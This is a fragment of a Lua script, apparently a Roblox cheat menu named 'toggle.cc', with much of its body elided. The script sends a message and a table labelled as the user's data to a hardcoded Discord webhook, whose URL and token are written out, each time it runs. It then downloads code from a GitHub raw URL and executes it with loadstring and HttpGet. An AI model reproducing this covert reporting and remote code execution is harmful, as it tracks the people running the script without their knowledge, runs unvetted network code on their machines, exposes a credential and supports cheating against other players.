...
local webhookcheck =
 ...
 --// Webhook url \\--
local url = "https://discord.com/api/webhooks/1101895444411449434/QFruZGts2Qm1HIXnmNHx3Zh7YJsxzyYaLsbJLQv71Ivkt6YA7xGhoQPaL_wdY0EEWsW0"
--// Data of the User \\--
local data = {
   ["content"] = " ***toggle.cc has Been Executed***", --// Messege of which script is executed
   ["embeds"] = {
       {
...
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/yooosf/libo/main/Library.lua"))()
...
local mainWindow = Library:CreateWindow("toggle.cc ezekial#2797")
